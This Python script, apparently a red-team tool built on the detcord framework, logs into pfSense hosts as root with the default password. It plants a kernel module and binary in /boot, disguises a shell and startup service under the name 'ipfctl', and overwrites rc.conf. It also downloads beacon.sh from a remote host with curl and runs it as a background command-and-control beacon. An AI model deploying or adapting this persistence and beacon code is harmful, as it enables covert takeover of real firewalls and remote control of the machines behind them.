from detcord import *
env = {}
env["hosts"] = ['Put IP of all Hosts to deploy on in this list']
env["user"] = "root"
env["pass"] = "pfsense"

@action
def deploy_Dad_and_Son(host):
    host.put("./dad.ko","/boot/dad.ko")
    host.run("rm /boot/kernel/son")
    host.put("./son","/boot/kernel/son")
    host.run("chmod +x /boot/kernel/son")
    host.put("./ipfctl.service","/etc/rc.d/ipfctl")
    host.put("./ipfctl.sh", "/usr/local/etc/rc.d/ipfctl.sh")
    host.run("chmod +x /usr/local/etc/rc.d/ipfctl.sh")
    host.run("chmod +x /etc/rc.d/ipfctl")
    host.run("cp /bin/sh /sbin/ipfctl")
    host.run("kldload /boot/dad.ko")
    host.run("echo 'ipfctl_enable=\"YES\"' > /etc/rc.conf")
    host.run("service ipfctl start && service ipfctl enabled")

def deploy_CrowdControlBeacon(host):
    host.run("curl http://172.16.128.17:8000/beacon.sh > /etc/beacon.sh")
    host.run("chmod +x /etc/beacon.sh")
    host.run("/bin/sh /etc/beacon.sh 10.2.1.254 &")
